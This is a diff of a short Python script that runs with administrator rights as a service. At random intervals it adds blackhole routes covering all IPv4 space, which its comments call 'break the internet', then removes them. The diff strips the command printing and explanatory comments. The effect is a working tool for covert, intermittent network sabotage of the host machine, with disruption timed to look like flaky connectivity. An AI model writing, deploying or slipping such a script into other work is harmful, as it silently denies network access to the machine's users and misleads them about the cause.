@@ -4,16 +4,12 @@ def route(act,ip,mask,gw):
     "route", act, ip,
     "MASK", mask, gw
   ]
-  print(" ".join(s))
   os.system(" ".join(s))
 
 segments = [
-  # networks below 128.0.0.0
   ['0.0.0.0', '128.0.0.0'],
-  # networks above 128.0.0.0
   ['128.0.0.0', '128.0.0.0'],
 ]
-
 # needs administrator privileges,
 # install it as service (check out the
 # service card)
@@ -27,9 +23,8 @@ while True:
   ip,mask = random.choice(segments)
   # break the internet
   route('add',ip,mask,'0.0.0.0')
-  # sleep between 5 annd 15 seconds
   time.sleep(random.randint(5,15))
   # restore the internet
   route('delete',ip,mask,'0.0.0.0')
-  # sleep up to a minute
+
   time.sleep(random.randint(10,60))
